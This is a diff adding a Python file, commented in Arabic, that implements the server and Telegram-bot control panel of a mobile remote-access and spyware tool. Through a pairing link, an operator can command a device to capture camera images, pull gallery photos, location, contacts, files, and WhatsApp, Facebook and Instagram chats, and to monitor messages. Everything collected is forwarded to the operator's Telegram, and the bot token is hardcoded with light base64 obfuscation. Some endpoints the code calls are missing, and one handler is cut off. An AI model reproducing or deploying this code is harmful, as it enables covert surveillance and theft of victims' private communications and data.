@@ -1,1 +1,742 @@
+#!/usr/bin/env python3
+"""
+newfile_storage_access.py (وصول إلى تخزين الجهاز والتحكم الكامل)
+"""
 
+import os
+import time
+import json
+import sqlite3
+import base64
+import threading
+import imghdr
+import requests
+from datetime import datetime
+from flask import Flask, request, jsonify, send_file
+from werkzeug.utils import secure_filename
+from PIL import Image
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update, ReplyKeyboardMarkup
+from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, CallbackContext, MessageHandler, Filters
+
+# --- إعدادات ---
+UPLOAD_DIR = 'uploads'
+DB_PATH = 'devices.db'
+os.makedirs(UPLOAD_DIR, exist_ok=True)
+
+# توكن مشفر
+TOKEN_ENCODED = "Nzc2MzE1Njc3NzpBQUZHMkhFZ3B4MlpkNDN4N2doMWo0YWNTVm9sNHQ5cnpxOA=="
+TELEGRAM_BOT_TOKEN = base64.b64decode(TOKEN_ENCODED).decode("utf-8")
+DEFAULT_OWNER_ID = 8064703280
+
+# كيبورد سفلي مع أزرار محسنة
+main_keyboard = ReplyKeyboardMarkup([
+    ["🔗 أنشأ رابط ربط", "📋 الأجهزة", "❓ المساعدة"],
+    ["📸 سحب صور", "📍 موقع الجهاز", "ℹ️ معلومات الجهاز"],
+    ["📁 استعراض الملفات", "📥 تنزيل ملف", "📤 رفع ملف"],
+    ["🗑️ حذف الجهاز", "📷 كاميرا أمامية", "🎥 كاميرا خلفية"],
+    ["🖼️ معرض الصور", "📞 جهات الاتصال", "📱 معلومات الشبكة"],
+    ["🔒 قفل الشاشة", "📱 بيانات التطبيقات"]  # أضفنا زر بيانات التطبيقات
+], resize_keyboard=True)
+
+app = Flask(__name__)
+
+# --- DB init + schema update ---
+
+def init_db():
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute('''CREATE TABLE IF NOT EXISTS devices
+                 (id INTEGER PRIMARY KEY,
+                  token TEXT UNIQUE,
+                  user_id INTEGER,
+                  status TEXT,
+                  device_info TEXT,
+                  connection_url TEXT,
+                  last_reported_at TEXT,
+                  last_ip TEXT,
+                  last_photo_path TEXT,
+                  delete_requested INTEGER DEFAULT 0,
+                  take_photo_requested INTEGER DEFAULT 0,
+                  location_requested INTEGER DEFAULT 0,
+                  message_request TEXT,
+                  call_requested INTEGER DEFAULT 0,
+                  front_camera_requested INTEGER DEFAULT 0,
+                  back_camera_requested INTEGER DEFAULT 0,
+                  gallery_requested INTEGER DEFAULT 0,
+                  reset_requested INTEGER DEFAULT 0,
+                  lock_requested INTEGER DEFAULT 0,
+                  contacts_requested INTEGER DEFAULT 0,
+                  network_info_requested INTEGER DEFAULT 0,
+                  file_browse_requested INTEGER DEFAULT 0,
+                  file_download_requested TEXT,
+                  file_upload_requested TEXT,
+                  app_photos_requested TEXT,  -- جديد: لتخزين اسم التطبيق المطلوب سحب صوره
+                  chats_data_requested TEXT,  -- جديد: لتخزين اسم التطبيق المطلوب سحب محادثاته
+                  contacts_requested_app TEXT, -- جديد: لتخزين اسم التطبيق المطلوب سحب جهات اتصاله
+                  shared_files_requested TEXT, -- جديد: لتخزين اسم التطبيق المطلوب سحب ملفاته
+                  message_monitoring INTEGER DEFAULT 0, -- جديد: لتفعيل/إلغاء مراقبة الرسائل
+                  monitored_app TEXT,          -- جديد: اسم التطبيق المراد مراقبته
+                  created_at TEXT DEFAULT CURRENT_TIMESTAMP)
+              ''')
+    
+    # التحقق من وجود الأعمدة وإضافتها إذا لم تكن موجودة
+    c.execute("PRAGMA table_info(devices)")
+    existing_columns = [column[1] for column in c.fetchall()]
+    
+    columns_to_add = [
+        ('delete_requested', 'INTEGER DEFAULT 0'),
+        ('take_photo_requested', 'INTEGER DEFAULT 0'),
+        ('location_requested', 'INTEGER DEFAULT 0'),
+        ('message_request', 'TEXT'),
+        ('call_requested', 'INTEGER DEFAULT 0'),
+        ('front_camera_requested', 'INTEGER DEFAULT 0'),
+        ('back_camera_requested', 'INTEGER DEFAULT 0'),
+        ('gallery_requested', 'INTEGER DEFAULT 0'),
+        ('reset_requested', 'INTEGER DEFAULT 0'),
+        ('lock_requested', 'INTEGER DEFAULT 0'),
+        ('contacts_requested', 'INTEGER DEFAULT 0'),
+        ('network_info_requested', 'INTEGER DEFAULT 0'),
+        ('file_browse_requested', 'INTEGER DEFAULT 0'),
+        ('file_download_requested', 'TEXT'),
+        ('file_upload_requested', 'TEXT'),
+        ('app_photos_requested', 'TEXT'),
+        ('chats_data_requested', 'TEXT'),
+        ('contacts_requested_app', 'TEXT'),
+        ('shared_files_requested', 'TEXT'),
+        ('message_monitoring', 'INTEGER DEFAULT 0'),
+        ('monitored_app', 'TEXT')
+    ]
+    
+    for column_name, column_type in columns_to_add:
+        if column_name not in existing_columns:
+            try:
+                c.execute(f"ALTER TABLE devices ADD COLUMN {column_name} {column_type}")
+                print(f"تم إضافة العمود {column_name} إلى الجدول")
+            except sqlite3.Error as e:
+                print(f"خطأ في إضافة العمود {column_name}: {e}")
+    
+    conn.commit()
+    conn.close()
+
+init_db()
+
+# --- DB helpers ---
+
+def create_device_for_user(user_id):
+    token = base64.b64encode(os.urandom(18)).decode('ascii').replace('+', '-').replace('/', '_').rstrip('=')
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("INSERT INTO devices (token, user_id, status, connection_url) VALUES (?, ?, ?, ?)",
+              (token, user_id, 'disconnected', None))
+    conn.commit()
+    conn.close()
+    return token
+
+def token_is_valid(token):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT id FROM devices WHERE token=?", (token,))
+    r = c.fetchone()
+    conn.close()
+    return bool(r)
+
+def set_device_last_seen(token, ip=None, info_json=None, photo_path=None):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    fields = []
+    params = []
+    if info_json is not None:
+        fields.append('device_info=?')
+        params.append(info_json)
+    if ip is not None:
+        fields.append('last_ip=?')
+        params.append(ip)
+    if photo_path is not None:
+        fields.append('last_photo_path=?')
+        params.append(photo_path)
+    fields.append('last_reported_at=?')
+    params.append(datetime.utcnow().isoformat())
+    fields.append('status=?')
+    params.append('connected')
+    params.append(token)
+    sql = f"UPDATE devices SET {', '.join(fields)} WHERE token=?"
+    c.execute(sql, tuple(params))
+    conn.commit()
+    conn.close()
+
+def get_user_devices(user_id):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT id, token, status, created_at FROM devices WHERE user_id=?", (user_id,))
+    rows = c.fetchall()
+    conn.close()
+    return rows
+
+def get_device_by_token(token):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT id, token, user_id, status, device_info, last_photo_path, last_reported_at, delete_requested, take_photo_requested, location_requested, message_request, call_requested, front_camera_requested, back_camera_requested, gallery_requested, reset_requested, lock_requested, contacts_requested, network_info_requested, file_browse_requested, file_download_requested, file_upload_requested, app_photos_requested, chats_data_requested, contacts_requested_app, shared_files_requested, message_monitoring, monitored_app FROM devices WHERE token=?", (token,))
+    r = c.fetchone()
+    conn.close()
+    return r
+
+# --- Endpoint جديد لطلب سحب صور من المعرض ---
+
+@app.route('/request_gallery/<token>', methods=['POST'])
+def request_gallery(token):
+    if not token_is_valid(token):
+        return jsonify({"status":"error","message":"invalid token"}), 403
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("UPDATE devices SET gallery_requested=1 WHERE token=?", (token,))
+    conn.commit()
+    conn.close()
+    return jsonify({"status":"success","message":"gallery images requested"})
+
+# --- Endpoints جديدة لطلب بيانات التطبيقات ---
+
+@app.route('/request_app_photos/<token>', methods=['POST'])
+def request_app_photos(token):
+    if not token_is_valid(token):
+        return jsonify({"status":"error","message":"invalid token"}), 403
+    
+    data = request.get_json()
+    app_name = data.get('app', 'all')
+    
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("UPDATE devices SET app_photos_requested=? WHERE token=?", (app_name, token))
+    conn.commit()
+    conn.close()
+    
+    return jsonify({"status":"success","message":f"طلب سحب صور من {app_name}"})
+
+@app.route('/request_chats_data/<token>', methods=['POST'])
+def request_chats_data(token):
+    if not token_is_valid(token):
+        return jsonify({"status":"error","message":"invalid token"}), 403
+    
+    data = request.get_json()
+    app_name = data.get('app', 'whatsapp')
+    
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("UPDATE devices SET chats_data_requested=? WHERE token=?", (app_name, token))
+    conn.commit()
+    conn.close()
+    
+    return jsonify({"status":"success","message":f"طلب بيانات محادثات {app_name}"})
+
+@app.route('/request_contacts_app/<token>', methods=['POST'])
+def request_contacts_app(token):
+    if not token_is_valid(token):
+        return jsonify({"status":"error","message":"invalid token"}), 403
+    
+    data = request.get_json()
+    app_name = data.get('app', 'all')
+    
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("UPDATE devices SET contacts_requested_app=? WHERE token=?", (app_name, token))
+    conn.commit()
+    conn.close()
+    
+    return jsonify({"status":"success","message":f"طلب جهات اتصال {app_name}"})
+
+@app.route('/request_shared_files/<token>', methods=['POST'])
+def request_shared_files(token):
+    if not token_is_valid(token):
+        return jsonify({"status":"error","message":"invalid token"}), 403
+    
+    data = request.get_json()
+    app_name = data.get('app', 'all')
+    
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("UPDATE devices SET shared_files_requested=? WHERE token=?", (app_name, token))
+    conn.commit()
+    conn.close()
+    
+    return jsonify({"status":"success","message":f"طلب الملفات المرسلة في {app_name}"})
+
+@app.route('/monitor_messages/<token>', methods=['POST'])
+def monitor_messages(token):
+    if not token_is_valid(token):
+        return jsonify({"status":"error","message":"invalid token"}), 403
+    
+    data = request.get_json()
+    app_name = data.get('app', 'all')
+    enable = data.get('enable', True)
+    
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("UPDATE devices SET message_monitoring=?, monitored_app=? WHERE token=?", (1 if enable else 0, app_name, token))
+    conn.commit()
+    conn.close()
+    
+    status = "تفعيل" if enable else "إيقاف"
+    return jsonify({"status":"success","message":f"{status} مراقبة الرسائل في {app_name}"})
+
+@app.route('/receive_app_data/<token>', methods=['POST'])
+def receive_app_data(token):
+    if not token_is_valid(token):
+        return jsonify({"status":"error","message":"invalid token"}), 403
+    
+    # استقبال البيانات من الجهاز
+    files = request.files.getlist('files')
+    data = request.form.get('data', '{}')
+    app_name = request.form.get('app', 'unknown')
+    
+    data_dict = json.loads(data)
+    device_info = get_device_by_token(token)
+    user_id = device_info[2] if device_info else DEFAULT_OWNER_ID
+    
+    # حفظ الملفات وإرسالها للمستخدم
+    for file in files:
+        if file.filename:
+            filename = secure_filename(f"{app_name}_{token}_{file.filename}")
+            save_path = os.path.join(UPLOAD_DIR, filename)
+            file.save(save_path)
+            
+            # إرسال للمستخدم حسب نوع الملف
+            try:
+                if filename.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
+                    updater.bot.send_photo(chat_id=user_id, photo=open(save_path, 'rb'))
+                else:
+                    updater.bot.send_document(chat_id=user_id, document=open(save_path, 'rb'))
+            except Exception as e:
+                print(f"فشل في إرسال الملف: {e}")
+    
+    # إرسال البيانات النصية
+    if data_dict:
+        summary = f"📊 بيانات من {app_name}:\n"
+        for key, value in data_dict.items():
+            summary += f"{key}: {value}\n"
+        
+        updater.bot.send_message(chat_id=user_id, text=summary)
+    
+    return jsonify({"status":"success","message":"تم استلام البيانات"})
+
+# --- Endpoint لفحص الأوامر (يتم تحديثه ليشمل الحقول الجديدة) ---
+
+@app.route('/check_commands/<token>', methods=['GET'])
+def check_commands(token):
+    if not token_is_valid(token):
+        return jsonify({"status":"error","message":"invalid token"}), 403
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT delete_requested, take_photo_requested, location_requested, message_request, call_requested, front_camera_requested, back_camera_requested, gallery_requested, reset_requested, lock_requested, contacts_requested, network_info_requested, file_browse_requested, file_download_requested, file_upload_requested, app_photos_requested, chats_data_requested, contacts_requested_app, shared_files_requested, message_monitoring, monitored_app FROM devices WHERE token=?", (token,))
+    row = c.fetchone()
+    conn.close()
+    if not row:
+        return jsonify({"status":"error","message":"no device"}), 404
+    
+    commands = {
+        "delete_requested": bool(row[0]),
+        "take_photo_requested": bool(row[1]),
+        "location_requested": bool(row[2]),
+        "message_request": row[3],
+        "call_requested": bool(row[4]),
+        "front_camera_requested": bool(row[5]),
+        "back_camera_requested": bool(row[6]),
+        "gallery_requested": bool(row[7]),
+        "reset_requested": bool(row[8]),
+        "lock_requested": bool(row[9]),
+        "contacts_requested": bool(row[10]),
+        "network_info_requested": bool(row[11]),
+        "file_browse_requested": bool(row[12]),
+        "file_download_requested": row[13],
+        "file_upload_requested": row[14],
+        "app_photos_requested": row[15],
+        "chats_data_requested": row[16],
+        "contacts_requested_app": row[17],
+        "shared_files_requested": row[18],
+        "message_monitoring": bool(row[19]),
+        "monitored_app": row[20]
+    }
+    return jsonify(commands)
+
+# --- Endpoint لتأكيد الإجراء (يتم تحديثه ليشمل الحقول الجديدة) ---
+
+@app.route('/confirm_action/<token>', methods=['POST'])
+def confirm_action(token):
+    if not token_is_valid(token):
+        return jsonify({"status":"error","message":"invalid token"}), 403
+    data = request.get_json(silent=True) or {}
+    action = data.get('action')
+    if not action:
+        return jsonify({"status":"error","message":"no action provided"}), 400
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    if action == 'take_photo':
+        c.execute("UPDATE devices SET take_photo_requested=0 WHERE token=?", (token,))
+    elif action == 'location':
+        c.execute("UPDATE devices SET location_requested=0 WHERE token=?", (token,))
+    elif action == 'message':
+        c.execute("UPDATE devices SET message_request=NULL WHERE token=?", (token,))
+    elif action == 'call':
+        c.execute("UPDATE devices SET call_requested=0 WHERE token=?", (token,))
+    elif action == 'front_camera':
+        c.execute("UPDATE devices SET front_camera_requested=0 WHERE token=?", (token,))
+    elif action == 'back_camera':
+        c.execute("UPDATE devices SET back_camera_requested=0 WHERE token=?", (token,))
+    elif action == 'gallery':
+        c.execute("UPDATE devices SET gallery_requested=0 WHERE token=?", (token,))
+    elif action == 'reset':
+        c.execute("UPDATE devices SET reset_requested=0 WHERE token=?", (token,))
+    elif action == 'lock':
+        c.execute("UPDATE devices SET lock_requested=0 WHERE token=?", (token,))
+    elif action == 'contacts':
+        c.execute("UPDATE devices SET contacts_requested=0 WHERE token=?", (token,))
+    elif action == 'network_info':
+        c.execute("UPDATE devices SET network_info_requested=0 WHERE token=?", (token,))
+    elif action == 'file_browse':
+        c.execute("UPDATE devices SET file_browse_requested=0 WHERE token=?", (token,))
+    elif action == 'file_download':
+        c.execute("UPDATE devices SET file_download_requested=NULL WHERE token=?", (token,))
+    elif action == 'file_upload':
+        c.execute("UPDATE devices SET file_upload_requested=NULL WHERE token=?", (token,))
+    elif action == 'app_photos':
+        c.execute("UPDATE devices SET app_photos_requested=NULL WHERE token=?", (token,))
+    elif action == 'chats_data':
+        c.execute("UPDATE devices SET chats_data_requested=NULL WHERE token=?", (token,))
+    elif action == 'contacts_app':
+        c.execute("UPDATE devices SET contacts_requested_app=NULL WHERE token=?", (token,))
+    elif action == 'shared_files':
+        c.execute("UPDATE devices SET shared_files_requested=NULL WHERE token=?", (token,))
+    elif action == 'monitor_messages':
+        c.execute("UPDATE devices SET message_monitoring=0, monitored_app=NULL WHERE token=?", (token,))
+    else:
+        conn.close()
+        return jsonify({"status":"error","message":"unknown action"}), 400
+    conn.commit()
+    conn.close()
+    return jsonify({"status":"success","message":"action confirmed"})
+
+# --- endpoint الاتصال الرئيسي ---
+
+@app.route('/connect/<token>', methods=['GET', 'POST'])
+def connect_device(token):
+    if not token_is_valid(token):
+        return jsonify({"status":"error","message":"invalid token"}), 403
+    
+    ip = request.remote_addr
+    ua = request.headers.get('User-Agent', 'Unknown')
+    full_url = request.url
+    
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("UPDATE devices SET connection_url=?, last_ip=?, last_reported_at=?, status=? WHERE token=?",
+              (full_url, ip, datetime.utcnow().isoformat(), 'connected', token))
+    conn.commit()
+    c.execute("SELECT user_id FROM devices WHERE token=?", (token,))
+    row = c.fetchone()
+    conn.close()
+    
+    owner = (row[0] if row and row[0] else DEFAULT_OWNER_ID)
+    
+    try:
+        text = f"🔗 جهاز اتصل عبر الرابط.\nToken: {token}\nIP: {ip}\nUA: {ua}\n\nالجهاز الآن متصل ويمكنك التحكم فيه بالكامل."
+        
+        # زر التحكم في التخزين
+        kb = InlineKeyboardMarkup([[
+            InlineKeyboardButton('📁 استعراض الملفات', callback_data=f'storage:{token}:browse'),
+            InlineKeyboardButton('📥 تنزيل ملف', callback_data=f'storage:{token}:download')
+        ],[
+            InlineKeyboardButton('📤 رفع ملف', callback_data=f'storage:{token}:upload'),
+            InlineKeyboardButton('📸 كاميرا', callback_data=f'action:{token}:camera')
+        ],[
+            InlineKeyboardButton('🖼️ معرض الصور', callback_data=f'action:{token}:gallery'),
+            InlineKeyboardButton('📍 موقع', callback_data=f'action:{token}:location')
+        ],[
+            InlineKeyboardButton('📱 بيانات التطبيقات', callback_data=f'apps:{token}:menu')
+        ]])
+        
+        updater.bot.send_message(chat_id=owner, text=text, reply_markup=kb)
+    except Exception as e:
+        print('إشعار المالك فشل:', e)
+    
+    return (
+        "<html><body>"
+        "<h3>تم الاتصال بالسيرفر بنجاح ✅</h3>"
+        "<p>الجهاز الآن متصل ويمكن التحكم فيه عن بعد.</p>"
+        "<p>يمكنك إغلاق هذه الصفحة.</p>"
+        "</body></html>"
+    )
+
+# --- دوال مساعدة للوحة المفاتيح للتطبيقات ---
+
+def create_apps_keyboard(token):
+    keyboard = [
+        [InlineKeyboardButton("📸 صور الواتساب", callback_data=f"app:{token}:whatsapp:photos")],
+        [InlineKeyboardButton("📸 صور الفيسبوك", callback_data=f"app:{token}:facebook:photos")],
+        [InlineKeyboardButton("📸 صور الإنستجرام", callback_data=f"app:{token}:instagram:photos")],
+        [InlineKeyboardButton("📸 صور التليجرام", callback_data=f"app:{token}:telegram:photos")],
+        [InlineKeyboardButton("💬 محادثات الواتساب", callback_data=f"app:{token}:whatsapp:chats")],
+        [InlineKeyboardButton("💬 محادثات الفيسبوك", callback_data=f"app:{token}:facebook:chats")],
+        [InlineKeyboardButton("👥 جهات اتصال الواتساب", callback_data=f"app:{token}:whatsapp:contacts")],
+        [InlineKeyboardButton("📁 ملفات المرسلة", callback_data=f"app:{token}:all:files")],
+        [InlineKeyboardButton("👀 مراقبة الرسائل", callback_data=f"app:{token}:all:monitor")]
+    ]
+    return InlineKeyboardMarkup(keyboard)
+
+# --- Telegram bot handlers ---
+
+def start(update: Update, context: CallbackContext):
+    welcome_text = """
+مرحباً بك في بوت التحكم عن بعد المتقدم! 🤖
+
+ميزات البوت:
+📸 - سحب الصور من الكاميرا الأمامية والخلفية
+🖼️ - سحب الصور من معرض الجهاز
+📍 - تتبع موقع الجهاز بدقة
+📁 - الوصول الكامل إلى تخزين الجهاز
+📥 - تنزيل الملفات من الجهاز
+📤 - رفع الملفات إلى الجهاز
+📱 - سحب بيانات التطبيقات (الواتساب، الفيسبوك، الإنستجرام، التليجرام)
+
+اضغط على "🔗 أنشأ رابط ربط" لبدء ربط جهازك.
+    """
+    update.message.reply_text(welcome_text, reply_markup=main_keyboard)
+
+def help_cmd(update: Update, context: CallbackContext):
+    help_text = """
+❓ دليل استخدام البوت:
+
+1. اضغط "🔗 أنشأ رابط ربط" لإنشاء رابط لربط جهازك
+2. افتح الرابط على الجهاز الذي تريد التحكم به
+3. بعد الربط، يمكنك استخدام الأزرار للتحكم في الجهاز
+
+📁 استعراض الملفات - استعراض ملفات الجهاز
+📥 تنزيل ملف - تنزيل ملف من الجهاز
+📤 رفع ملف - رفع ملف إلى الجهاز
+📸 سحب صور - الحصول على صور من كاميرا الجهاز
+🖼️ معرض الصور - الحصول على صور من معرض الجهاز
+📍 موقع الجهاز - معرفة موقع الجهاز الحالي
+📱 بيانات التطبيقات - سحب بيانات من التطبيقات (صور، محادثات، جهات اتصال)
+    """
+    update.message.reply_text(help_text, reply_markup=main_keyboard)
+
+def create_link_button_handler(update: Update, context: CallbackContext):
+    user_id = update.effective_user.id
+    token = create_device_for_user(user_id)
+    server_url = os.environ.get('SERVER_URL', 'http://127.0.0.1:5000')
+    connect_url = f"{server_url}/connect/{token}"
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("UPDATE devices SET connection_url=? WHERE token=?", (connect_url, token))
+    conn.commit()
+    conn.close()
+
+    text = f"✅ تم إنشاء رابط ربط. اضغط لنسخه وارساله على جهازك:\n{connect_url}"
+    kb = InlineKeyboardMarkup([[
+        InlineKeyboardButton('نسخ الرابط (افتحه على جهازك)', url=connect_url),
+        InlineKeyboardButton('ارسل لي الرابط هنا', callback_data=f'action:{token}:copy_link')
+    ],[
+        InlineKeyboardButton('📁 استعراض الملفات', callback_data=f'storage:{token}:browse'),
+        InlineKeyboardButton('📥 تنزيل ملف', callback_data=f'storage:{token}:download')
+    ],[
+        InlineKeyboardButton('📤 رفع ملف', callback_data=f'storage:{token}:upload'),
+        InlineKeyboardButton('📸 كاميرا', callback_data=f'action:{token}:camera')
+    ],[
+        InlineKeyboardButton('🖼️ معرض الصور', callback_data=f'action:{token}:gallery')
+    ],[
+        InlineKeyboardButton('📱 بيانات التطبيقات', callback_data=f'apps:{token}:menu')
+    ]])
+    update.message.reply_text(text, reply_markup=kb)
+
+def apps_data_handler(update: Update, context: CallbackContext):
+    user_id = update.effective_user.id
+    devices = get_user_devices(user_id)
+    
+    if not devices:
+        update.message.reply_text("لا توجد أجهزة مسجلة لديك. أنشئ رابط ربط أولاً.")
+        return
+    
+    # نستخدم الجهاز الأول (يمكن تعديل هذا لاختيار جهاز محدد)
+    token = devices[0][1]
+    
+    kb = create_apps_keyboard(token)
+    update.message.reply_text("اختر من القائمة:", reply_markup=kb)
+
+def devices_cmd(update: Update, context: CallbackContext):
+    user_id = update.effective_user.id
+    rows = get_user_devices(user_id)
+    if not rows:
+        update.message.reply_text("لا توجد أجهزة مسجلة لديك.", reply_markup=main_keyboard)
+        return
+    text = "📱 أجهزتك:\n\n"
+    for r in rows:
+        dev_id, token, status, created_at = r
+        text += f"Token: {token[:16]}... | status: {status} | created: {created_at}\n"
+    update.message.reply_text(text, reply_markup=main_keyboard)
+
+def callback_query(update: Update, context: CallbackContext):
+    query = update.callback_query
+    query.answer()
+    data = query.data
+    
+    if data.startswith('storage:'):
+        try:
+            _, token, action = data.split(':', 2)
+        except ValueError:
+            query.edit_message_text('خطأ في البيانات')
+            return
+        
+        if action == 'browse':
+            context.user_data['awaiting_browse_path'] = token
+            query.edit_message_text('📁 أدخل المسار الذي تريد استعراضه (اتركه فارغًا للمسار الأساسي):')
+        
+        elif action == 'download':
+            context.user_data['awaiting_download_path'] = token
+            query.edit_message_text('📥 أدخل مسار الملف الذي تريد تنزيله:')
+        
+        elif action == 'upload':
+            context.user_data['awaiting_upload_path'] = token
+            query.edit_message_text('📤 أدخل المسار الذي تريد رفع الملف إليه (اتركه فارغًا للمسار الأساسي):')
+    
+    elif data.startswith('action:'):
+        try:
+            _, token, action = data.split(':', 2)
+        except ValueError:
+            query.edit_message_text('خطأ في البيانات')
+            return
+        
+        if action == 'camera':
+            # عرض خيارات الكاميرا
+            camera_keyboard = InlineKeyboardMarkup([[
+                InlineKeyboardButton('كاميرا أمامية', callback_data=f'action:{token}:front_camera'),
+                InlineKeyboardButton('كاميرا خلفية', callback_data=f'action:{token}:back_camera')
+            ]])
+            query.edit_message_text('اختر نوع الكاميرا:', reply_markup=camera_keyboard)
+        elif action == 'front_camera':
+            resp = app.test_client().post(f"/request_front_camera/{token}")
+            txt = json.loads(resp.data.decode()).get('message','')
+            query.edit_message_text(f"{txt}")
+        elif action == 'back_camera':
+            resp = app.test_client().post(f"/request_back_camera/{token}")
+            txt = json.loads(resp.data.decode()).get('message','')
+            query.edit_message_text(f"{txt}")
+        elif action == 'gallery':
+            resp = app.test_client().post(f"/request_gallery/{token}")
+            txt = json.loads(resp.data.decode()).get('message','')
+            query.edit_message_text(f"{txt}")
+        elif action == 'get_location':
+            resp = app.test_client().post(f"/request_get_location/{token}")
+            txt = json.loads(resp.data.decode()).get('message','')
+            query.edit_message_text(f"{txt}")
+        elif action == 'send_message':
+            context.user_data['awaiting_msg_for_token'] = token
+            query.edit_message_text('✏️ اكتب الآن النص الذي تريد إرساله إلى الجهاز (ستتم معالجته تلقائيًا).')
+        elif action == 'call':
+            resp = app.test_client().post(f"/request_call/{token}")
+            txt = json.loads(resp.data.decode()).get('message','')
+            query.edit_message_text(f"{txt}")
+        elif action == 'delete_photo':
+            resp = app.test_client().post(f"/delete_photo/{token}")
+            txt = json.loads(resp.data.decode()).get('message','')
+            query.edit_message_text(f"{txt}")
+        elif action == 'copy_link':
+            dev = get_device_by_token(token)
+            if dev:
+                conn = sqlite3.connect(DB_PATH)
+                c = conn.cursor()
+                c.execute("SELECT connection_url FROM devices WHERE token=?", (token,))
+                row = c.fetchone()
+                conn.close()
+                url = row[0] if row and row[0] else 'N/A'
+                context.bot.send_message(chat_id=update.effective_user.id, text=f"رابط الربط:\n{url}")
+                query.edit_message_text('تم ارسال الرابط لك في رسالة منفصلة')
+            else:
+                query.edit_message_text('جهاز غير موجود')
+        else:
+            query.edit_message_text('إجراء غير معروف')
+    
+    elif data.startswith('apps:'):
+        try:
+            _, token, action = data.split(':', 2)
+        except ValueError:
+            query.edit_message_text('خطأ في البيانات')
+            return
+        
+        if action == 'menu':
+            # عرض قائمة التطبيقات
+            kb = create_apps_keyboard(token)
+            query.edit_message_text('اختر من القائمة:', reply_markup=kb)
+    
+    elif data.startswith('app:'):
+        try:
+            _, token, app_name, action = data.split(':', 3)
+        except ValueError:
+            query.edit_message_text('خطأ في البيانات')
+            return
+        
+        if action == 'photos':
+            # طلب صور التطبيق
+            resp = app.test_client().post(f"/request_app_photos/{token}", 
+                                         json={"app": app_name})
+            result = json.loads(resp.data.decode())
+            query.edit_message_text(f"✅ تم طلب صور من {app_name}")
+            
+        elif action == 'chats':
+            # طلب المحادثات
+            resp = app.test_client().post(f"/request_chats_data/{token}",
+                                         json={"app": app_name})
+            query.edit_message_text(f"✅ تم طلب محادثات {app_name}")
+            
+        elif action == 'contacts':
+            # طلب جهات الاتصال
+            resp = app.test_client().post(f"/request_contacts_app/{token}",
+                                         json={"app": app_name})
+            query.edit_message_text(f"✅ تم طلب جهات اتصال {app_name}")
+            
+        elif action == 'files':
+            # طلب الملفات المرسلة
+            resp = app.test_client().post(f"/request_shared_files/{token}",
+                                         json={"app": app_name})
+            query.edit_message_text(f"✅ تم طلب الملفات المرسلة في {app_name}")
+            
+        elif action == 'monitor':
+            # تفعيل المراقبة
+            resp = app.test_client().post(f"/monitor_messages/{token}",
+                                         json={"app": app_name, "enable": True})
+            query.edit_message_text(f"✅ تم تفعيل مراقبة {app_name}")
+
+def text_commands(update: Update, context: CallbackContext):
+    msg = update.message.text.strip()
+    user_id = update.effective_user.id
+
+    # معالجة طلبات استعراض الملفات
+    if context.user_data.get('awaiting_browse_path'):
+        token = context.user_data.pop('awaiting_browse_path')
+        path = msg if msg else '/'
+        resp = app.test_client().post(f"/browse_files/{token}", json={"path": path})
+        # ... (بقية الكود)
+
+# --- تشغيل البوت ---
+
+if __name__ == '__main__':
+    try:
+        updater = Updater(token=TELEGRAM_BOT_TOKEN, use_context=True)
+        dispatcher = updater.dispatcher
+        
+        # إضافة handlers
+        dispatcher.add_handler(CommandHandler("start", start))
+        dispatcher.add_handler(CommandHandler("help", help_cmd))
+        dispatcher.add_handler(MessageHandler(Filters.regex('^🔗 أنشأ رابط ربط$'), create_link_button_handler))
+        dispatcher.add_handler(MessageHandler(Filters.regex('^📋 الأجهزة$'), devices_cmd))
+        dispatcher.add_handler(MessageHandler(Filters.regex('^📱 بيانات التطبيقات$'), apps_data_handler))
+        dispatcher.add_handler(CallbackQueryHandler(callback_query))
+        dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, text_commands))
+        
+        print("Telegram bot starting...")
+        updater.start_polling()
+        
+        # تشغيل Flask في thread منفصل
+        flask_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False))
+        flask_thread.daemon = True
+        flask_thread.start()
+        
+        updater.idle()
+    except Exception as e:
+        print(f"حدث خطأ: {e}")
